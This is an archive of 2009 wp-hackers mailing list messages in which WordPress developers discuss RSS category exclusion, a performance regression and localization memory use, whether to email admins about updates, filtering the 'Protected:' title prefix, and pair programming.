> Or you can use my Simply Exclude plugin
> http://wordpress.org/extend/plugins/simply-exclude/ to have a nice user
> interface so you don't have to touch the code. The code uses the same basic
> principal as the function above. I wrote a similar plugin that allow exclude
> of categories, tags and authors from is_front, is_archive, is_search and
> is_feed actions.
>
> Best,
>
> Paul
>
>
> On Oct 17, 2009, at 9:10 AM, Jeremi Bergman wrote:
>
>  Yes, it excludes certain categories from the RSS feed, among other things,
>> which is what we're looking for?
>>
>> Is there an alternative to excluding categories from the rss feeds?
>>
>> --
>> Jeremi Bergman
>> 865-622-7134
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Jeremi Bergman
865-622-7134

From johan.eenfeldt at gmail.com  Sun Oct 18 13:44:04 2009
From: johan.eenfeldt at gmail.com (Johan Eenfeldt)
Date: Sun, 18 Oct 2009 15:44:04 +0200
Subject: [wp-hackers] Major performance regression between 2.7 and 2.8
Message-ID: <7547287e0910180644v7efe2c70q2bd56c9f0e699ba6@mail.gmail.com>

Hi,

I've been doing some benchmarking[1] of the latest WordPress major
releases and found a regression of 40% (loadtime for empty stock
frontpage) between 2.7 and 2.8.

I've been working to track it down and I have so far found:
http://core.trac.wordpress.org/ticket/10971
http://core.trac.wordpress.org/ticket/10972

Which gives us back a bit more than half of the regression.

There also appears to be performance regressions in (at least):
wp_widgets_init, sanitize_bookmark_field() and among the
actions/filters.

As I do not have any more time right now to work on this I'm hoping
someone else out there want to lend a hand.

Thanks,
Johan Eenfeldt

[1] Some graphs and stuff here:
http://devel.kostdoktorn.se/profiling-wordpress-performance-regression

From ajd at cloudiness.com  Sun Oct 18 23:02:48 2009
From: ajd at cloudiness.com (Art Delano)
Date: Sun, 18 Oct 2009 19:02:48 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <e1202cb10910161101u37ad2b6ah82040ef3f7b9b006@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com>
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
	<e1202cb10910161101u37ad2b6ah82040ef3f7b9b006@mail.gmail.com>
Message-ID: <11135C70-28FA-40D8-8F2B-C0AB8E4B81A8@cloudiness.com>


On Oct 16, 2009, at 2:01 PM, Jeremy Clarke wrote:

> On Fri, Oct 16, 2009 at 1:29 PM, Otto <otto at ottodestruct.com> wrote:
>> Question to those of you who like this idea of emailing the admin for
>> upgrade notification:
>>
>> Are you currently using this plugin?
>> http://wordpress.org/extend/plugins/upgrade-notification-by-email/
>>
>> If not, why not?
>
> I don't use it because in my 5+ years of using WP and installing it
> all over the place I've worked out lo-fi systems (i.e. a text file)
> where i list all the WP installs I'm responsible for and their
> versions. When there is an update I learn about it on Twitter (because
> I follow tons of WP people, not something I recommend to normal users)
> and know to reconsider my text file and try to keep them all up to
> date.
>
> So I personally don't really need the plugin or the feature. I'd still
> use it, but going back to the old installs and installing the plugin
> is more than its worth for me.

After building a couple dozen WP-based sites for clients, last spring  
I scratched together a tool that does the version tracking for all of  
them, based on the current version as reported by wordpress.org.  
Status updates are one-button actions and results are cached for a  
fixed period.

If there's interest, I can re-hack this to make it more generally  
usable (right now it's pretty much hard-coded to accommodate my day  
job). Note that this is a standalone script, not a WordPress plugin.

And for whatever it's worth, I still depend on the WP Developers RSS  
feed for first alerts on updates (which I check through my mail  
client). And I think an email notification option for WP admin  
accounts is a fine idea.

From lynne.pope at gmail.com  Mon Oct 19 00:10:33 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Mon, 19 Oct 2009 13:10:33 +1300
Subject: [wp-hackers] wordpress security
In-Reply-To: <4AD89D94.4050401@wptavern.com>
References: <862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com> 
	<4AD89D94.4050401@wptavern.com>
Message-ID: <427667db0910181710n31c0e7efmd0e103c37a7a80be@mail.gmail.com>

2009/10/17 Jeff Chandler <jeffc at wptavern.com>

> ....
>
> When I first started using WordPress, I signed up to the WordPress
> Announcements mailing list because I wanted to be notified of when a new
> update was available via Email because I check email 100 times a day versus
> RSS feeds or the dashboard. Well, that list is as good as dead. The only
> time I've received an email from that list is a big announcement email
> regarding WordPress 2.7 from Matt Mullenweg. That's it, in the span of two
> years. So this would turn the WP Announcements mailing list into something
> automated controlled by the blog owner for the site administrator since the
> middle man ain't cutting it anymore.
>

I am opposed to adding an email alert function into the core for two
reasons:
1. Users can become reliant on receiving an email to alert them to the
availability of an upgrade. If the email does not arrive they will feel
confident that there hasn't been an upgrade.

The non-techy user may not understand that the emails may be getting caught
by spam filters. They may also not be aware that their servers do not
necessarily allow PHP Mailer. You just have to look at the forums to see how
many people complain, "my email doesn't work". Those who need the SMTP mail
plugin would be capable of also installing the email notification to admin
plugin.

Even so, an email to an admin can cause issues. A site may have several
admins without clear roles as to who does what. A blog admin is not
necessarily the same person who is responsible for keeping the site updated
- these people, who may have server but not blog admin status, need to be
able to get notifications.

2.  I don't feel that a new core feature is needed. It's simply a bandaid
for the projects lack of clear communication channels.

We have feeds, blog announcements, dashboard notices, dashboard feeds, and
hundreds of blogs that leap into action with announcements anytime anything
changes. We even have a WordPress Twitter account people can follow, and a
feed from this if people want to keep track of it in a feed reader.

What is lacking is a centralised, "should subscribe to" place for receiving
important notices. The WP Announcements list is a logical place for this. A
"Subscribe to Announcements" link underneath the download link on the
WordPress home page would encourage people to subscribe to this list. Adding
this to the readme in the core would also encourage newcomers to subscribe -
especially if it was accompanied by a notice saying that the mailing list is
used for announcements about new releases and security patches.

I agree with Nathan and others that more can be done to educate
inexperienced users. I just don't agree with the concept of emailing admins
from within WordPress itself.

Lynne

http://twitter.com/elpie/

From nb at nikolay.bg  Mon Oct 19 09:15:36 2009
From: nb at nikolay.bg (Nikolay Bachiyski)
Date: Mon, 19 Oct 2009 02:15:36 -0700
Subject: [wp-hackers] l10n object bloat and class PO
In-Reply-To: <7547287e0910151745s154e7fd6ha9534cd3b925fd72@mail.gmail.com>
References: <7547287e0910151745s154e7fd6ha9534cd3b925fd72@mail.gmail.com>
Message-ID: <87e663fa0910190215s10299ebbl19fba046028093c7@mail.gmail.com>

On Thu, Oct 15, 2009 at 17:45, Johan Eenfeldt <johan.eenfeldt at gmail.com> wrote:
> Somewhat specialized questions, here...
>
> Working on caching the $l10n object (responsible for 20-75% of
> localized WordPress startup time) I've been banging my head a bit
> against the wp-include/pomo/ classes.
>
> $l10n is 3.3Mb out of the ~14Mb startup WP allocations in my test. At
> least 750Kb of that appears to be totally unused.
>
> Question 1: is class PO [1] (wp-includes/pomo/po.php) ever used?
>
> I'm guessing it might possibly be in the WP.com admin generate plugin
> pot stuff, but there doesn't seem to be anything in WordPress.
>

Yes, whenever you are using translated version of WordPress, it is.

> Question 2: is there any reason not to remove (or split out) the
> members of class Translation_Entry which are only used by PO (and not
> MO)?

I am working on improving the PO/MO classes for both speed and memory
and I will have some actual results, soon. When I wrote the code my
initial tests didn't show that much of a difference as the real-world
usage did.

Happy hacking,
Nikolay.

From johan.eenfeldt at gmail.com  Mon Oct 19 09:31:26 2009
From: johan.eenfeldt at gmail.com (Johan Eenfeldt)
Date: Mon, 19 Oct 2009 11:31:26 +0200
Subject: [wp-hackers] l10n object bloat and class PO
In-Reply-To: <87e663fa0910190215s10299ebbl19fba046028093c7@mail.gmail.com>
References: <7547287e0910151745s154e7fd6ha9534cd3b925fd72@mail.gmail.com>
	<87e663fa0910190215s10299ebbl19fba046028093c7@mail.gmail.com>
Message-ID: <7547287e0910190231k7e3eb401w1bbcb7b2bffa6fac@mail.gmail.com>

Thanks for answering!

On Mon, Oct 19, 2009 at 11:15 AM, Nikolay Bachiyski <nb at nikolay.bg> wrote:
> On Thu, Oct 15, 2009 at 17:45, Johan Eenfeldt <johan.eenfeldt at gmail.com> wrote:
>> Question 1: is class PO [1] (wp-includes/pomo/po.php) ever used?
>>
>> I'm guessing it might possibly be in the WP.com admin generate plugin
>> pot stuff, but there doesn't seem to be anything in WordPress.
>
> Yes, whenever you are using translated version of WordPress, it is.

Could you give me a pointer? As far as I can see "class PO" is never
referenced anywhere.

>> Question 2: is there any reason not to remove (or split out) the
>> members of class Translation_Entry which are only used by PO (and not
>> MO)?
>
> I am working on improving the PO/MO classes for both speed and memory
> and I will have some actual results, soon. When I wrote the code my
> initial tests didn't show that much of a difference as the real-world
> usage did.

If there is anything to test or if you want any help anywhere I'm
working in this area again.

I saw http://core.trac.wordpress.org/ticket/10165 and was going to
look at that unless you are working on something else.

Thank you,
Johan

From nb at nikolay.bg  Mon Oct 19 10:01:15 2009
From: nb at nikolay.bg (Nikolay Bachiyski)
Date: Mon, 19 Oct 2009 03:01:15 -0700
Subject: [wp-hackers] l10n object bloat and class PO
In-Reply-To: <7547287e0910190231k7e3eb401w1bbcb7b2bffa6fac@mail.gmail.com>
References: <7547287e0910151745s154e7fd6ha9534cd3b925fd72@mail.gmail.com> 
	<87e663fa0910190215s10299ebbl19fba046028093c7@mail.gmail.com> 
	<7547287e0910190231k7e3eb401w1bbcb7b2bffa6fac@mail.gmail.com>
Message-ID: <87e663fa0910190301s60e4362exbccac51c066c65aa@mail.gmail.com>

On Mon, Oct 19, 2009 at 02:31, Johan Eenfeldt <johan.eenfeldt at gmail.com> wrote:
> I saw http://core.trac.wordpress.org/ticket/10165 and was going to
> look at that unless you are working on something else.

I want to try keep these as objects, since it makes more sense and is
a lot easier to both use and extend.

Only if there is no chance of keeping memory/CPU consumption in normal
bounds, I will resort back to big arrays and a lot of accompanying
functions.

Happy hacking,
Nikolay.

From johan.eenfeldt at gmail.com  Mon Oct 19 11:02:07 2009
From: johan.eenfeldt at gmail.com (Johan Eenfeldt)
Date: Mon, 19 Oct 2009 13:02:07 +0200
Subject: [wp-hackers] l10n object bloat and class PO
In-Reply-To: <87e663fa0910190301s60e4362exbccac51c066c65aa@mail.gmail.com>
References: <7547287e0910151745s154e7fd6ha9534cd3b925fd72@mail.gmail.com>
	<87e663fa0910190215s10299ebbl19fba046028093c7@mail.gmail.com>
	<7547287e0910190231k7e3eb401w1bbcb7b2bffa6fac@mail.gmail.com>
	<87e663fa0910190301s60e4362exbccac51c066c65aa@mail.gmail.com>
Message-ID: <7547287e0910190402v35633657m7c8058a258a73e11@mail.gmail.com>

On Mon, Oct 19, 2009 at 12:01 PM, Nikolay Bachiyski <nb at nikolay.bg> wrote:
> On Mon, Oct 19, 2009 at 02:31, Johan Eenfeldt <johan.eenfeldt at gmail.com> wrote:
>> I saw http://core.trac.wordpress.org/ticket/10165 and was going to
>> look at that unless you are working on something else.
>
> I want to try keep these as objects, since it makes more sense and is
> a lot easier to both use and extend.
>
> Only if there is no chance of keeping memory/CPU consumption in normal
> bounds, I will resort back to big arrays and a lot of accompanying
> functions.
>

Ok, I wish you luck! :) And if you want any assistance I'm available.

To return to the question that started this thread would you accept a
patch that split out:
Translation_Entry->translator_comments
Translation_Entry->extracted_comments
Translation_Entry->references_comments
Translation_Entry->flags

Perhaps into Translation_Entry_Full or Translation_Entry_PO or something?

My measurements of memory usage delta over load_textdomain:
2.9.rare: 4173844
2.9.rare-split-entry: 3220932

difference: 952912 / 2870 => 332bytes / entry

It is actually also measurable on pageloads (empty installation
frontpage translation enabled)
2.9.rare: 217ms on average
2.9.rare-split-entry: 199ms on average

Thanks
Johan

From piemanek at gmail.com  Mon Oct 19 12:37:31 2009
From: piemanek at gmail.com (Simon Blackbourn)
Date: Mon, 19 Oct 2009 13:37:31 +0100
Subject: [wp-hackers] filtering french characters in the_title
Message-ID: <65b196650910190537y643fec50uc2c77de250fa898b@mail.gmail.com>

Hi

I'm developing a multi-lingual site that uses password-protected posts, and
my client doesn't want the word 'protected' to appear anywhere.

I'm filtering the_title like so:

add_filter( 'the_title', 'no_prot_in_title' );

function no_prot_in_title( $title ) {

    $pattern[0] = '/Protected:/';                    // english
    $pattern[1] = '/Protegido:/';                    // spanish
    $pattern[2] = '/Prot?g? :/';                     // french
    $replacement[0] = '';
    $replacement[1] = '';
    $replacement[2] = '';

    return preg_replace( $pattern, $replacement, $title );

}

It works perfectly for English and Spanish, but not for French, so I presume
the accented letters are the source of the problem.

I've tried using &eacute; instead of the actual letters ? and tried
replacing the space with &nbsp; but it still doesn't work (btw - there is
definitely a space before the colon in the french translation).

Does anyone know how I might get this to work?

Thanks!

From scribu at gmail.com  Mon Oct 19 12:41:34 2009
From: scribu at gmail.com (scribu)
Date: Mon, 19 Oct 2009 15:41:34 +0300
Subject: [wp-hackers] filtering french characters in the_title
In-Reply-To: <65b196650910190537y643fec50uc2c77de250fa898b@mail.gmail.com>
References: <65b196650910190537y643fec50uc2c77de250fa898b@mail.gmail.com>
Message-ID: <349fe48b0910190541g293f1c7ckb49d31aa6a333265@mail.gmail.com>

On Mon, Oct 19, 2009 at 3:37 PM, Simon Blackbourn <piemanek at gmail.com>wrote:

> Hi
>
> I'm developing a multi-lingual site that uses password-protected posts, and
> my client doesn't want the word 'protected' to appear anywhere.
>
> I'm filtering the_title like so:
>
> add_filter( 'the_title', 'no_prot_in_title' );
>
> function no_prot_in_title( $title ) {
>
>    $pattern[0] = '/Protected:/';                    // english
>    $pattern[1] = '/Protegido:/';                    // spanish
>    $pattern[2] = '/Prot?g? :/';                     // french
>    $replacement[0] = '';
>    $replacement[1] = '';
>    $replacement[2] = '';
>
>    return preg_replace( $pattern, $replacement, $title );
>
> }
>

Try this:

return str_replace(__('Protected:'), '', $title);

-- 
http://scribu.net

From ozh at planetozh.com  Mon Oct 19 12:46:17 2009
From: ozh at planetozh.com (Ozh)
Date: Mon, 19 Oct 2009 14:46:17 +0200
Subject: [wp-hackers] filtering french characters in the_title
In-Reply-To: <65b196650910190537y643fec50uc2c77de250fa898b@mail.gmail.com>
Message-ID: <OFE76FA8EA.3EB0E24B-ONC1257654.00460423-C1257654.004627D8@notes.edfgdf.fr>

> It works perfectly for English and Spanish, but not for French, so I 
presume
> the accented letters are the source of the problem.

you'll probably have to replace '&eacute;' instead of '?' (or maybe even 
&#233; or something like this)



From otto at ottodestruct.com  Mon Oct 19 13:46:24 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 19 Oct 2009 08:46:24 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com> 
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com> 
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com> 
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com> 
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com> 
	<4AD8BC80.6000406@gaarai.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com> 
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
Message-ID: <161617690910190646i2e060e9aj94642c7770091182@mail.gmail.com>

On Fri, Oct 16, 2009 at 2:36 PM, Nathan Rice <ncrice at gmail.com> wrote:
> Do you really think that adding an email notification option will be
> completely useless to the millions of WordPress users out there?

Yes. I do. I think it is absolutely and utterly useless, and will not
help anybody anywhere.

> Good grief, if they don't like it, they can turn it off. I probably will.
> But then, they have no reason to blame WordPress.

They have no reason to blame anybody but themselves right now.

Good grief man, even when the notification was added to the admin
screens, people clamored and yelled for some way to disable *that*. Do
you really think that an admin email enabled by default will go over
well? I've already seen too many posts out there complaining about how
WP is too naggy. This is only going to make things worse, and increase
(not decrease) many people's opinion that WordPress is insecure.

> If they still get hacked, it's definitivley their own fault.

It doesn't make any difference whose fault it is. That won't stop
anybody from complaining, loudly.

-Otto
Sent from Memphis, TN, United States

From eike.starkmann at fu-berlin.de  Mon Oct 19 14:06:10 2009
From: eike.starkmann at fu-berlin.de (Eike Starkmann)
Date: Mon, 19 Oct 2009 16:06:10 +0200
Subject: [wp-hackers] Distributed Pairprogramming for
	Wordpress	development?
In-Reply-To: <161617690910140810n688a2af5k8b4ac00d7703569b@mail.gmail.com>
References: <4AD5C8A7.9030701@fu-berlin.de>
	<161617690910140810n688a2af5k8b4ac00d7703569b@mail.gmail.com>
Message-ID: <4ADC7252.307@fu-berlin.de>

Otto wrote:
> On Wed, Oct 14, 2009 at 7:48 AM, Eike Starkmann
> <eike.starkmann at fu-berlin.de> wrote:
>> Saros is an Eclipse plugin for collaborative text editing and distributed
>> pair programming, i.e. it allows two or more developers to work together in
>> real-time on the same files.
> 
> Speaking as somebody who's been coding professionally for 10 years, I
> couldn't let this go by...
> 
> I've had to do this sort of thing before (not distributed, but pair
> programming). It is, by far, the worst idea ever conceived by
> man(agers). I would rip my own arm off and beat myself to death with
> it before I'd ever do this sort of thing again.
> 
Perhaps you made some bad experiences, with pair programming and it is
good that you share it, but there are a lot of people who have made
different experiences and find it very useful.
> The theory of pair programming is that you have two developers working
> on the same piece of code, able to notice and correct mistakes.
> 
> The reality of pair programming is that one guy is better than the
> other guy, and spends half his time explaining the problem and
> solution to the other guy, instead of simply coding the damn thing.
> The lesser of the two programmers only drags the other guy down to his
> level, and wastes both of their time.
> 
Yes that can happen, but did you ever thought of the knowledge transfer
that happens in this situation. I think there is no better way for
training a newcomer than putting him together with a skilled developer
explaining him while working how everything works. By the way are there
such big differences in the wordpress core team?
> The only way that pair programming works is if both programmers are a)
> equally skilled and b) not particularly skilled. In other words, for
> newbs fresh out of college, it works fine. For a seasoned programmer,
> the very notion is a valid reason to look for a job elsewhere.
> 
> In general, it's a horrible practice, and anybody actively using it is
> an idiot. IMO, of course.
>
Of course a programmer who doesn't want to explain what he does and
prefers work alone will not like pair programming.
> Also, peer review is highly overrated as well, for other reasons.
> People who actively write good code don't need it, and people who
> don't write good code shouldn't be put in the position of writing code
> in the first place.
> 
That's also one think you can learn while working together with a
skilled programmer, although I don't believe that good code is always
bugfree, everybody makes mistakes.

Al least, I just wanted to find out, if such a tool like Saros can
improve/be useful for open source software development. There are lost
of scopes behind just doing pair programming, for example reviewing
security patches.

Greets, Eike

-- 
Eike Starkmann
This message is part of my Master thesis research. Feel free to contact
my advisors in case of inappropriate behavior on my side:
christopher.oezbek at fu-berlin.de and stephan.salinger at fu-berlin.de

From wp-hackers at striderweb.com  Mon Oct 19 14:43:38 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Mon, 19 Oct 2009 09:43:38 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com>
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com>
	<4AD8BC80.6000406@gaarai.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
Message-ID: <346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>


On Oct 16, 2009, at 2:36 PM, Nathan Rice wrote:

> Bloggers aren't the only people who use WordPress. It's a different  
> world
> than it was 3 years ago. We can't keep pretending that beginners  
> aren't
> using WP. And we can't keep giving them the middle finger for doing  
> so.
> WordPress is popular BECAUSE of its low barrier of entry.

The company I work for runs its web site on Drupal, and I'm the  
admin.  The update emails are extremely handy, because the only time I  
log in to the admin is when something needs to be changed.  It's not a  
blog, and isn't updated nearly as regularly as most blog installs are.

+1 from me for "an update is available" emails to admin.  Turn it on  
by default, and put in a checkbox to easily turn it off.

A plugin is not enough, because the people who *most* need this are  
exactly the ones who won't install a plugin.

Stephen


-- 
Stephen Rider
http://striderweb.com/

From jeremib at gmail.com  Mon Oct 19 14:52:11 2009
From: jeremib at gmail.com (Jeremi Bergman)
Date: Mon, 19 Oct 2009 10:52:11 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com> 
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com> 
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com> 
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com> 
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com> 
	<4AD8BC80.6000406@gaarai.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com> 
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com> 
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
Message-ID: <f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>

I would agree with this.  As an admin of multiple WP sites, I do not login
to each admin panel unless needed to.

Would be nice to get an email that said an update was available.


On Mon, Oct 19, 2009 at 10:43 AM, Stephen Rider
<wp-hackers at striderweb.com>wrote:

>
> On Oct 16, 2009, at 2:36 PM, Nathan Rice wrote:
>
>  Bloggers aren't the only people who use WordPress. It's a different world
>> than it was 3 years ago. We can't keep pretending that beginners aren't
>> using WP. And we can't keep giving them the middle finger for doing so.
>> WordPress is popular BECAUSE of its low barrier of entry.
>>
>
> The company I work for runs its web site on Drupal, and I'm the admin.  The
> update emails are extremely handy, because the only time I log in to the
> admin is when something needs to be changed.  It's not a blog, and isn't
> updated nearly as regularly as most blog installs are.
>
> +1 from me for "an update is available" emails to admin.  Turn it on by
> default, and put in a checkbox to easily turn it off.
>
> A plugin is not enough, because the people who *most* need this are exactly
> the ones who won't install a plugin.
>
> Stephen
>
>
> --
> Stephen Rider
> http://striderweb.com/
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Jeremi Bergman
865-622-7134

From piemanek at gmail.com  Mon Oct 19 15:41:58 2009
From: piemanek at gmail.com (Simon Blackbourn)
Date: Mon, 19 Oct 2009 16:41:58 +0100
Subject: [wp-hackers] filtering french characters in the_title
In-Reply-To: <OFE76FA8EA.3EB0E24B-ONC1257654.00460423-C1257654.004627D8@notes.edfgdf.fr>
References: <65b196650910190537y643fec50uc2c77de250fa898b@mail.gmail.com>
	<OFE76FA8EA.3EB0E24B-ONC1257654.00460423-C1257654.004627D8@notes.edfgdf.fr>
Message-ID: <65b196650910190841u19aa2d3cqb2f93ef1ff2ce961@mail.gmail.com>

thanks for the ideas, but unfortunately neither of them work (i was hoping
scribu's would as it would be future-proof if other languages were added).

From kikizas at gmail.com  Mon Oct 19 16:02:03 2009
From: kikizas at gmail.com (Demetris)
Date: Mon, 19 Oct 2009 19:02:03 +0300
Subject: [wp-hackers] filtering french characters in the_title
In-Reply-To: <65b196650910190841u19aa2d3cqb2f93ef1ff2ce961@mail.gmail.com>
References: <65b196650910190537y643fec50uc2c77de250fa898b@mail.gmail.com>
	<OFE76FA8EA.3EB0E24B-ONC1257654.00460423-C1257654.004627D8@notes.edfgdf.fr>
	<65b196650910190841u19aa2d3cqb2f93ef1ff2ce961@mail.gmail.com>
Message-ID: <9f34a3610910190902ta03c222wad6a5f6bf76c1a21@mail.gmail.com>

On Mon, Oct 19, 2009 at 6:41 PM, Simon Blackbourn <piemanek at gmail.com> wrote:
> thanks for the ideas, but unfortunately neither of them work (i was hoping
> scribu's would as it would be future-proof if other languages were added).
>
WP 2.8 added a new filter hook: protected_title_format ? have you tried that?

Cheers!

Demetris
http://op111.net/

From mike at zed1.com  Mon Oct 19 16:06:51 2009
From: mike at zed1.com (Mike Little)
Date: Mon, 19 Oct 2009 17:06:51 +0100
Subject: [wp-hackers] filtering french characters in the_title
In-Reply-To: <65b196650910190841u19aa2d3cqb2f93ef1ff2ce961@mail.gmail.com>
References: <65b196650910190537y643fec50uc2c77de250fa898b@mail.gmail.com> 
	<OFE76FA8EA.3EB0E24B-ONC1257654.00460423-C1257654.004627D8@notes.edfgdf.fr>
	<65b196650910190841u19aa2d3cqb2f93ef1ff2ce961@mail.gmail.com>
Message-ID: <7235ce780910190906r3c739054s61401f908f9af936@mail.gmail.com>

2009/10/19 Simon Blackbourn <piemanek at gmail.com>

> thanks for the ideas, but unfortunately neither of them work (i was hoping
> scribu's would as it would be future-proof if other languages were added).
>


Hi Simon,

You should be using the 'protected_title_format' filter.

This will do what you want, regardless of the language,


add_filter('protected_title_format', 'my_protected_filter');
function my_protected_filter($prefix) {
    //error_log("received $prefix");
    return '%s';
}


Mike
-- 
Mike Little
http://zed1.com/

From listswphackers at mist.org.uk  Mon Oct 19 17:11:36 2009
From: listswphackers at mist.org.uk (mrmist)
Date: Mon, 19 Oct 2009 18:11:36 +0100
Subject: [wp-hackers] wordpress security
In-Reply-To: <f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com>
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com>
	<4AD8BC80.6000406@gaarai.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
Message-ID: <Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>

In message 
<f38206c90910190752p6257046bk217941cabb21feed at mail.gmail.com>, Jeremi 
Bergman <jeremib at gmail.com> writes
>I would agree with this.  As an admin of multiple WP sites, I do not login
>to each admin panel unless needed to.
>
>Would be nice to get an email that said an update was available.
>

But then as an admin of multiple sites, you do not fit the supposed core 
target for such a feature, that being the average Jo user.

A feature such as email inform might be useful, but it'd have to be 
pretty customisable - e.g. the to address not necessarily being the 
"admin" user - and warn users that the feature is dependant on server 
email config being correct.

I also believe that the points made by others already in this thread, 
such as the aspect of creating reliance on such an email, are pretty 
valid and I could see it creating more support load in the forums than 
it solves.

On balance, I'd say that the demographic that ignore or who are bothered 
by the upgrade nag screen, would ignore or be bothered by an email, and 
that those who fall outside of this demographic would have either 
already upgraded based on the nag screen, or represent a small enough 
set that it's just feature bloat to stick it in core.
-- 
mrmist

From piemanek at gmail.com  Mon Oct 19 17:25:56 2009
From: piemanek at gmail.com (Simon Blackbourn)
Date: Mon, 19 Oct 2009 18:25:56 +0100
Subject: [wp-hackers] filtering french characters in the_title
In-Reply-To: <7235ce780910190906r3c739054s61401f908f9af936@mail.gmail.com>
References: <65b196650910190537y643fec50uc2c77de250fa898b@mail.gmail.com>
	<OFE76FA8EA.3EB0E24B-ONC1257654.00460423-C1257654.004627D8@notes.edfgdf.fr>
	<65b196650910190841u19aa2d3cqb2f93ef1ff2ce961@mail.gmail.com>
	<7235ce780910190906r3c739054s61401f908f9af936@mail.gmail.com>
Message-ID: <65b196650910191025t1428ac4fq40786e14b89dbef6@mail.gmail.com>

> You should be using the 'protected_title_format' filter.
>
> This will do what you want, regardless of the language,
>


that's brilliant, works perfectly thanks

From wp-hackers at striderweb.com  Mon Oct 19 17:37:06 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Mon, 19 Oct 2009 12:37:06 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com>
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com>
	<4AD8BC80.6000406@gaarai.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
Message-ID: <91DE3ADA-F3C8-4F7A-B985-B560000C0D6C@striderweb.com>


On Oct 19, 2009, at 12:11 PM, mrmist wrote:

> But then as an admin of multiple sites, you do not fit the supposed  
> core target for such a feature, that being the average Jo user.

It seems it's useful for more than just "Joe User" then.

> A feature such as email inform might be useful, but it'd have to be  
> pretty customisable

I don't see why.  Mail to the admin email address.  For Joe User the  
emails are probably going to User #1.  If it **needs** to be  
customizable for certain cases, advanced users can use plugins.

> - e.g. the to address not necessarily being the "admin" user - and  
> warn users that the feature is dependant on server email config  
> being correct.

Can the system check for this and simply put in a caution on the  
Settings page if needed (e.g. "Your server is not configured to send  
mail")?  I'm really asking, as I'm not too knowledgeable of PHP  
